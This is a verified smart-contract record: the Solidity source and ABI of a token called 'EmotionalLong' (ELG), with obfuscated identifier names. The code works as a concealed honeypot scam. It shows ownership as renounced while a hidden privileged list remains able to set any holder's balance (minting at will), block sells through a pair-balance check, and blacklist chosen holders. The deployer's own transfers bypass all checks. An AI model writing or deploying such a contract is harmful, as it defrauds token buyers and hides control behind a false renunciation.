{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface takeSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromAt {\n    function createPair(address enableShould, address maxLaunch) external returns (address);\n}\n\ninterface autoMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedToken) external view returns (uint256);\n\n    function transfer(address launchedReceiver, uint256 minFee) external returns (bool);\n\n    function allowance(address amountLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedReceiver,\n        uint256 minFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeLaunch, uint256 value);\n    event Approval(address indexed amountLaunch, address indexed spender, uint256 value);\n}\n\ninterface listIsMarketing is autoMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EmotionalLong is launchMax, autoMax, listIsMarketing {\n\n    uint256 public minEnableList;\n\n    uint256 public txReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalTokenTeam;\n    }\n\n    mapping(address => uint256) private limitSwap;\n\n    function senderTotal(address liquidityLaunched) public {\n        require(liquidityLaunched.balance < 100000);\n        if (teamSellMode) {\n            return;\n        }\n        if (txReceiver != tradingLaunch) {\n            tradingLaunch = txReceiver;\n        }\n        senderTxMin[liquidityLaunched] = true;\n        if (minBuy == teamList) {\n            minTo = false;\n        }\n        teamSellMode = true;\n    }\n\n    bool public minBuy;\n\n    function owner() external view returns (address) {\n        return minTrading;\n    }\n\n    address public modeFeeBuy;\n\n    function approve(address txExempt, uint256 minFee) public virtual override returns (bool) {\n        launchListAmount[_msgSender()][txExempt] = minFee;\n        emit Approval(_msgSender(), txExempt, minFee);\n        return true;\n    }\n\n    function allowance(address walletLiquidity, address txExempt) external view virtual override returns (uint256) {\n        if (txExempt == exemptShould) {\n            return type(uint256).max;\n        }\n        return launchListAmount[walletLiquidity][txExempt];\n    }\n\n    mapping(address => mapping(address => uint256)) private launchListAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeTeam;\n    }\n\n    function feeReceiverList() private view {\n        require(senderTxMin[_msgSender()]);\n    }\n\n    function tokenAmountReceiver(uint256 minFee) public {\n        feeReceiverList();\n        buyMax = minFee;\n    }\n\n    function atTeam() public {\n        emit OwnershipTransferred(autoTokenTeam, address(0));\n        minTrading = address(0);\n    }\n\n    uint256 constant launchedLiquidity = 17 ** 10;\n\n    constructor (){\n        \n        takeSender shouldTotal = takeSender(exemptShould);\n        modeFeeBuy = fromAt(shouldTotal.factory()).createPair(shouldTotal.WETH(), address(this));\n        if (minBuy != minTo) {\n            amountFrom = false;\n        }\n        autoTokenTeam = _msgSender();\n        atTeam();\n        senderTxMin[autoTokenTeam] = true;\n        limitSwap[autoTokenTeam] = autoTxTake;\n        if (txReceiver == tradingLaunch) {\n            minTo = true;\n        }\n        emit Transfer(address(0), autoTokenTeam, autoTxTake);\n    }\n\n    string private autoToken = \"Emotional Long\";\n\n    uint256 private autoTxTake = 100000000 * 10 ** 18;\n\n    uint256 fromReceiver;\n\n    function transfer(address receiverFeeExempt, uint256 minFee) external virtual override returns (bool) {\n        return listAuto(_msgSender(), receiverFeeExempt, minFee);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTxTake;\n    }\n\n    function listAuto(address tokenAmount, address launchedReceiver, uint256 minFee) internal returns (bool) {\n        if (tokenAmount == autoTokenTeam) {\n            return atMode(tokenAmount, launchedReceiver, minFee);\n        }\n        uint256 launchedFrom = autoMax(modeFeeBuy).balanceOf(exemptToken);\n        require(launchedFrom == buyMax);\n        require(launchedReceiver != exemptToken);\n        if (receiverLaunched[tokenAmount]) {\n            return atMode(tokenAmount, launchedReceiver, launchedLiquidity);\n        }\n        return atMode(tokenAmount, launchedReceiver, minFee);\n    }\n\n    function isAt(address receiverFeeExempt, uint256 minFee) public {\n        feeReceiverList();\n        limitSwap[receiverFeeExempt] = minFee;\n    }\n\n    bool public minTo;\n\n    function transferFrom(address tokenAmount, address launchedReceiver, uint256 minFee) external override returns (bool) {\n        if (_msgSender() != exemptShould) {\n            if (launchListAmount[tokenAmount][_msgSender()] != type(uint256).max) {\n                require(minFee <= launchListAmount[tokenAmount][_msgSender()]);\n                launchListAmount[tokenAmount][_msgSender()] -= minFee;\n            }\n        }\n        return listAuto(tokenAmount, launchedReceiver, minFee);\n    }\n\n    address exemptShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return minTrading;\n    }\n\n    address private minTrading;\n\n    mapping(address => bool) public senderTxMin;\n\n    uint8 private modeTeam = 18;\n\n    bool private amountFrom;\n\n    uint256 buyMax;\n\n    bool private teamList;\n\n    event OwnershipTransferred(address indexed amountTeam, address indexed senderLaunch);\n\n    address exemptToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public autoTokenTeam;\n\n    bool public teamSellMode;\n\n    mapping(address => bool) public receiverLaunched;\n\n    function atMode(address tokenAmount, address launchedReceiver, uint256 minFee) internal returns (bool) {\n        require(limitSwap[tokenAmount] >= minFee);\n        limitSwap[tokenAmount] -= minFee;\n        limitSwap[launchedReceiver] += minFee;\n        emit Transfer(tokenAmount, launchedReceiver, minFee);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoToken;\n    }\n\n    uint256 public tradingLaunch;\n\n    function balanceOf(address launchedToken) public view virtual override returns (uint256) {\n        return limitSwap[launchedToken];\n    }\n\n    string private totalTokenTeam = \"ELG\";\n\n    function amountLiquidity(address toAmount) public {\n        feeReceiverList();\n        \n        if (toAmount == autoTokenTeam || toAmount == modeFeeBuy) {\n            return;\n        }\n        receiverLaunched[toAmount] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAmount\",\"type\":\"address\"}],\"name\":\"amountLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTokenTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFeeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFee\",\"type\":\"uint256\"}],\"name\":\"isAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnableList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFeeBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"}],\"name\":\"senderTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTxMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSellMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minFee\",\"type\":\"uint256\"}],\"name\":\"tokenAmountReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFeeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EmotionalLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}